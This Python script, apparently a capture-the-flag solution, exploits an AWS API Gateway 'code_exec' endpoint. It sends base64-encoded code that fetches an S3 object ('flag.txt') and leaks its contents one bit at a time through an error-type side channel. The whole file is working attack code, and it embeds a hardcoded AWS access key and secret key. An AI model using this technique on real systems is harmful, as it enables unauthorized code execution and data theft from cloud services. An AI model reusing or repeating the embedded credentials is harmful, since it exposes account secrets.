import requests
import json
import base64
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIIWK4BEMG",
                       aws_secret_access_key="yQXeKSwcKm2sMkj34DVhMhzMAQ/U+U1en5S4xmsd",
                       aws_token="",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

URL = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_bit(idx, bit, target_url):
    code = f"""
import urllib.request, urllib.error
try:
    req = urllib.request.Request('{target_url}', headers={{'User-Agent': 'Boto3/1.26.0'}})
    urllib.request.urlopen(req, timeout=3).read()
    r = "SUCCESS"
except urllib.error.HTTPError as e:
    r = str(e.code) + ":" + e.read().decode('utf-8')
except Exception as e:
    r = type(e).__name__ + ":" + str(e)

if {idx} < len(r):
    char = r[{idx}]
    if ord(char) & {bit}:
        sum([1], '')
    else:
        sum([1])
else:
    sum([1])
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    headers = {"Content-Type": "application/json"}
    payload = {"code": encoded_code}
    try:
        res = requests.post(URL, json=payload, auth=auth, timeout=10)
        data = res.json()
        if "errorType" in data and data["errorType"] == "TypeError":
            return True
        return False
    except Exception as e:
        print(f"Error making request: {e}")
        return False

def extract_string(target_url, max_len=500):
    extracted = ""
    for idx in range(max_len):
        char_code = 0
        for bit in [1, 2, 4, 8, 16, 32, 64, 128]:
            if test_bit(idx, bit, target_url):
                char_code |= bit
        if char_code == 0:
            break
        extracted += chr(char_code)
        print(f"Progress: {extracted}")
    return extracted

print("Extracting from virtual-hosted-style S3 URL...")
print(extract_string("https://userd8a2f72fe43094e8.s3.us-east-1.amazonaws.com/flag.txt", max_len=200))

print("Extracting from path-style S3 URL...")
print(extract_string("https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt", max_len=200))
